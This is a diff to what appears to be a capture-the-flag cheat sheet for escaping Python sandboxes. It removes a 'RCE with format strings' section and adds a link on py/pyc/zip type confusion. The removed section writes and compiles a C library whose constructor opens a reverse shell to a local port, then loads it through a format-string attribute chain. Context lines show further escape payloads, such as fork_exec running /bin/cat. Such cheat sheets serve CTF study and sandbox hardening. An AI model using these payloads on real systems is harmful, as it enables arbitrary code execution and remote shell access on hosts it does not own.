@@ -264,18 +264,6 @@ __builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", 
 "{0\x2e\x5f\x5fclass\x5f\x5f}".format(0)
 ```
 
-
-### RCE with format strings
-```py
-# Requirements: file upload/arb write and ctypes loaded
-
-open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\n__attribute__((constructor))\nvoid init() {\nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\"");\n}""")
-os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
-
-print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
-
-```
-
 ### OOB Read using LOAD_FAST
 ```py
 # Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc
@@ -399,6 +387,9 @@ user_defined_function.__closure__
 user_defined_class.__reduce_ex__(user_defined_class(), n)
 pdb.set_trace() # works also if __builtins__ is empty
 ```
+
+### py/pyc/zip file type confusion
+https://github.com/python/cpython/issues/103051 
 
 # Credits
  - https://shirajuki.js.org/blog/pyjail-cheatsheet
